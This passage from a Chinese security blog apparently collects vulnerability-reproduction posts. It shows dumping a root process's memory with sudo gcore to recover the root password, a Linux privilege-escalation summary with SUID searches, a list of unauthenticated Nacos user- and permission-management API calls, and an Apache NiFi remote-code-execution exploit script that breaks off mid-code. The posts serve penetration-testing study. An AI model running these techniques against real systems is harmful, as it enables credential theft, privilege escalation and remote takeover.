+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a><code>sudo -l</code></h2><p><img src="http://42.192.89.201/usr/uploads/2021/02/2091869574.png" alt="image.png"></p>
+<p>可以看到 <code>gcore</code>具有 sudo 权限</p>
+<h3 id="检查进程列表"><a href="#检查进程列表" class="headerlink" title="检查进程列表"></a>检查进程列表</h3><p><img src="http://42.192.89.201/usr/uploads/2021/02/3780200594.png" alt="image.png"></p>
+<p>可以使用 gcore 将此进程的内存进行转储</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gcore 493</span><br></pre></td></tr></table></figure>
+
+<p>然后会得到一个 core.493 文件<br><img src="http://42.192.89.201/usr/uploads/2021/02/2778748820.png" alt="image.png"></p>
+<p>然后直接 <code>strings core.493</code>可以看到：<br><img src="http://42.192.89.201/usr/uploads/2021/02/1862046169.png" alt="image.png"><br>这样就得到了 root 账户的密码<br><img src="http://42.192.89.201/usr/uploads/2021/02/3426335714.png" alt="image.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">Linux提权总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-04 15:57:00" itemprop="dateCreated datePublished" datetime="2021-02-04T15:57:00+08:00">2021-02-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-05 14:29:10" itemprop="dateModified" datetime="2021-02-05T14:29:10+08:00">2021-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Linux-提权总结"><a href="#Linux-提权总结" class="headerlink" title="Linux 提权总结"></a>Linux 提权总结</h2><p>Linux 提权，前提是拿到了一个低权限的账号，能上传和下载文件，主要思路有：</p>
+<ol>
+<li>内核提权。网上各种大佬的 payload 很多，关键在于要能找到利用哪个 exp 以及具体如何利用。省力点的方法是用 searchsploit 或者 linux-exploit-suggester.sh 来查找，熟悉之后难度也不大。</li>
+<li>suid 提权。这里也包含了 sudo 这种方式，两种方法的思路都是一样的，区别在于 suid 针对单个程序，sudo 针对某个用户。这类提权方式的主要思路是：管理员授权普通用户去执行 root 权限的操作，而不需要知道 root 的密码，合理的利用拥有 root 权限的程序，就可以实现提权。通常遇到的情况有：</li>
+</ol>
+<p>（1）直接提权，sudo -i 就可以切换到 root 了；</p>
+<p>（2）修改系统文件，如计划任务文件、用户文件、密码文件、sudoers 文件等，本文把这个作为彩蛋后续也讲一下；</p>
+<p>（3）修改程序本身，如果对程序有写权限的话，直接把反弹的 bash 命令写到程序里，运行程序即可提权；</p>
+<p>（4）对程序进行溢出，部分程序通过端口可以实现和用户的交互，这也就存在可以溢出的前提。</p>
+<p>总的来说，suid 提权难度没有上限和下限，简单的直接一个 sudo -i 命令，难的涉及到溢出，相当于在挖 0day。</p>
+<ol start="3">
+<li>第三方应用提权，某些程序使用 root 权限启动，如果第三方服务或者程序存在漏洞或者配置问题，可以被利用来获得 root 权限。相比前几种方式，难度属于中间，不像内核提权套路很固定，也不像 suid 提权方法很灵活多样。</li>
+</ol>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>脚本一把嗦</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester-2</a><br><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></p>
+<h3 id="Suid-提权"><a href="#Suid-提权" class="headerlink" title="Suid 提权"></a>Suid 提权</h3><p>我们查看具有 root 用户权限的 SUID 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type d 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><p>在找到具有 suid 或 sudo 权限的程序后，可以在下面网站查找利用方式</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br>如果目标环境有 python 的话也可以试试下面的脚本<br><a target="_blank" rel="noopener" href="https://github.com/Frissi0n/GTFONow">suidcheck</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Wireguard_%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Wireguard_%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">Wireguard 代理工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-28 16:38:00" itemprop="dateCreated datePublished" datetime="2021-01-28T16:38:00+08:00">2021-01-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-03 11:19:46" itemprop="dateModified" datetime="2021-02-03T11:19:46+08:00">2021-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/" itemprop="url" rel="index"><span itemprop="name">工具分享</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Wireguard-代理工具"><a href="#Wireguard-代理工具" class="headerlink" title="Wireguard 代理工具"></a>Wireguard 代理工具</h2><h3 id="Wireguard-简介"><a href="#Wireguard-简介" class="headerlink" title="Wireguard 简介"></a>Wireguard 简介</h3><p>WireGuard 是一个利用现有社会最先进的加密技术而产生的非常简单和快捷的 VPN 工具。它的目标是比 IPsec 更快，更简单，更精简，更易用，同时避免大规模配置 IPsec 的麻烦事。同时 WireGuard 也打算比 OpenVPN 更高效。WireGuard 设计为通用 VPN，可在嵌入式设备和常见计算机上运行，适用于多种不同情况。WireGuard 最初是为 Linux 内核发布的，而现在 WireGuard 已经可广泛部署并且跨平台支持。WireGuard 目前正在大力发展，但 WireGuard 已经被认为是业内最安全，最易用和最简单的 VPN 解决方案。<br>官网链接：<a target="_blank" rel="noopener" href="https://www.wireguard.com/">https://www.wireguard.com/</a></p>
+<h3 id="WireGuard-安装"><a href="#WireGuard-安装" class="headerlink" title="WireGuard 安装"></a>WireGuard 安装</h3><h4 id="一键安装脚本"><a href="#一键安装脚本" class="headerlink" title="一键安装脚本"></a>一键安装脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O &#x2F;opt&#x2F;wireguard.sh https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teddysun&#x2F;across&#x2F;master&#x2F;wireguard.sh</span><br><span class="line">chmod 755 &#x2F;opt&#x2F;wireguard.sh</span><br><span class="line">&#x2F;opt&#x2F;wireguard.sh -r</span><br></pre></td></tr></table></figure>
+
+<h4 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h4><p>注意虚拟机要使用桥接网络</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>由于它很容易实现，而且可用性也很大，我尝试创建一个解析器来帮助识别这种类型的流量。<br>为了我们的目的，我们可以忽略数据包的标头，只关注有效负载数据。<br><img src="http://42.192.89.201/usr/uploads/2021/01/3988029068.png" alt="image20210128115636132.png"></p>
+<p>从有效负载分析中，我们看到第一个数据包以 01 00 00 00 开头。在以下数据包上使用相同的模式，响应上为 02 00 00 00，在流量的其余部分上为 04 00 00 00。<br><img src="http://42.192.89.201/usr/uploads/2021/01/848666677.png" alt="image20210128115705818.png"><br><img src="http://42.192.89.201/usr/uploads/2021/01/230585914.png" alt="image20210128115727308.png"></p>
+<p>如果我们用<a target="_blank" rel="noopener" href="https://www.wireguard.com/protocol/">Wireguard 的有文档化协议交叉引用</a>，我们可以确认数据以 8 位模式 （0100 0000， 0200 0000， 0400 0000） 开头，因此我们可以假设这些模式将有助于识别这种类型的流量。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.starryvoid.com/archives/337.html">https://blog.starryvoid.com/archives/337.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://community.rsa.com/community/products/netwitness/blog/2019/04/18/identify-wireguard-traffic-on-netwitness-packets">https://community.rsa.com/community/products/netwitness/blog/2019/04/18/identify-wireguard-traffic-on-netwitness-packets</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nacos_%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nacos_%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3/" class="post-title-link" itemprop="url">Nacos 未授权接口</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-26 11:28:00" itemprop="dateCreated datePublished" datetime="2021-01-26T11:28:00+08:00">2021-01-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-23 16:30:19" itemprop="dateModified" datetime="2021-04-23T16:30:19+08:00">2021-04-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/blob/f01aae73ee4ed72a8952f6288a89ed2ab1c6b0c0/console-ui/src/reducers/authority.js">https://github.com/alibaba/nacos/blob/f01aae73ee4ed72a8952f6288a89ed2ab1c6b0c0/console-ui/src/reducers/authority.js</a></p>
+<p>当 Nacos 服务端未开启鉴权时可直接访问下列 API 接口<br>开启鉴权可参考官方文档：<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/auth.html">https://nacos.io/zh-cn/docs/auth.html</a><br>看到有文章说要加上 <strong>User-Agent 请求头</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Nacos-Server</span><br></pre></td></tr></table></figure>
+
+<p>但是在测试之后发现好像不需要改 UA 也可以访问 API</p>
+<p>根据相应功能的接口 uri 进行访问 然后根据返回内容添加参数即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 用户列表</span><br><span class="line"> * @param &#123;*&#125; params</span><br><span class="line"> *&#x2F;</span><br><span class="line">const getUsers &#x3D; params &#x3D;&gt; dispatch &#x3D;&gt;</span><br><span class="line">  request.get(&#39;v1&#x2F;auth&#x2F;users&#39;, &#123; params &#125;).then(data &#x3D;&gt; dispatch(&#123; type: USER_LIST, data &#125;));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 创建用户</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const createUser &#x3D; ([username, password]) &#x3D;&gt;</span><br><span class="line">  request.post(&#39;v1&#x2F;auth&#x2F;users&#39;, &#123; username, password &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 通过username 模糊匹配</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const searchUsers &#x3D; username &#x3D;&gt;</span><br><span class="line">  request.get(&#39;v1&#x2F;auth&#x2F;users&#x2F;search&#39;, &#123; params: &#123; username &#125; &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 删除用户</span><br><span class="line"> * @param &#123;*&#125; username</span><br><span class="line"> *&#x2F;</span><br><span class="line">const deleteUser &#x3D; username &#x3D;&gt;</span><br><span class="line">  request.delete(&#39;v1&#x2F;auth&#x2F;users&#39;, &#123; params: &#123; username &#125; &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 重置密码</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const passwordReset &#x3D; ([username, newPassword]) &#x3D;&gt;</span><br><span class="line">  request.put(&#39;v1&#x2F;auth&#x2F;users&#39;, &#123; username, newPassword &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 角色列表</span><br><span class="line"> * @param &#123;*&#125; params</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">const getRoles &#x3D; params &#x3D;&gt; dispatch &#x3D;&gt;</span><br><span class="line">  request.get(&#39;v1&#x2F;auth&#x2F;roles&#39;, &#123; params &#125;).then(data &#x3D;&gt; dispatch(&#123; type: ROLE_LIST, data &#125;));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 通过username 模糊匹配</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const searchRoles &#x3D; role &#x3D;&gt;</span><br><span class="line">  request.get(&#39;v1&#x2F;auth&#x2F;roles&#x2F;search&#39;, &#123; params: &#123; role &#125; &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 创建角色</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const createRole &#x3D; ([role, username]) &#x3D;&gt;</span><br><span class="line">  request.post(&#39;v1&#x2F;auth&#x2F;roles&#39;, &#123; role, username &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 删除角色</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const deleteRole &#x3D; role &#x3D;&gt;</span><br><span class="line">  request.delete(&#39;v1&#x2F;auth&#x2F;roles&#39;, &#123; params: role &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 权限列表</span><br><span class="line"> * @param &#123;*&#125; params</span><br><span class="line"> *&#x2F;</span><br><span class="line">const getPermissions &#x3D; params &#x3D;&gt; dispatch &#x3D;&gt;</span><br><span class="line">  request</span><br><span class="line">    .get(&#39;v1&#x2F;auth&#x2F;permissions&#39;, &#123; params &#125;)</span><br><span class="line">    .then(data &#x3D;&gt; dispatch(&#123; type: PERMISSIONS_LIST, data &#125;));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 给角色添加权限</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const createPermission &#x3D; ([role, resource, action]) &#x3D;&gt;</span><br><span class="line">  request.post(&#39;v1&#x2F;auth&#x2F;permissions&#39;, &#123; role, resource, action &#125;).then(res &#x3D;&gt; successMsg(res));</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 删除权限</span><br><span class="line"> * @param &#123;*&#125; param0</span><br><span class="line"> *&#x2F;</span><br><span class="line">const deletePermission &#x3D; permission &#x3D;&gt;</span><br><span class="line">  request.delete(&#39;v1&#x2F;auth&#x2F;permissions&#39;, &#123; params: permission &#125;).then(res &#x3D;&gt; successMsg(res));</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache_NiFi_API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache_NiFi_API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">Apache NiFi API远程代码执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-22 18:11:00" itemprop="dateCreated datePublished" datetime="2021-01-22T18:11:00+08:00">2021-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-03 11:22:53" itemprop="dateModified" datetime="2021-02-03T11:22:53+08:00">2021-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Apache-NiFi-API远程代码执行"><a href="#Apache-NiFi-API远程代码执行" class="headerlink" title="Apache NiFi API远程代码执行"></a>Apache NiFi API远程代码执行</h2><h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><p>一个易用、强大、可靠的数据处理与分发系统。基于Web图形界面，通过拖拽、连接、配置完成基于流程的编程，实现数据采集等功能</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li> ≤1.12.1</li>
+</ul>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">class Exp:</span><br><span class="line">    def __init__(self, url):</span><br><span class="line">        self.url &#x3D; url</span><br><span class="line"></span><br><span class="line">    def check_is_vul(self):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;access&#x2F;config&quot;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.get(url&#x3D;url, verify&#x3D;False)</span><br><span class="line">            data &#x3D; res.json()</span><br><span class="line">            return not data[&quot;config&quot;][&quot;supportsLogin&quot;]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def clean_up(self, p_id):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;processors&#x2F;&quot; + p_id</span><br><span class="line">        data &#x3D; &#123;&#39;revision&#39;: &#123;&#39;clientId&#39;: &#39;x&#39;, &#39;version&#39;: 1&#125;, &#39;state&#39;: &#39;STOPPED&#39;&#125;</span><br><span class="line">        req.put(url&#x3D;url + &quot;&#x2F;run-status&quot;, data&#x3D;json.dumps(data), verify&#x3D;False)</span><br><span class="line">        req.delete(url + &quot;&#x2F;threads&quot;, verify&#x3D;False)</span><br><span class="line"></span><br><span class="line">    def exploit(self, cmd):</span><br><span class="line">        g_id &#x3D; self.fetch_process_group()</span><br><span class="line">        if 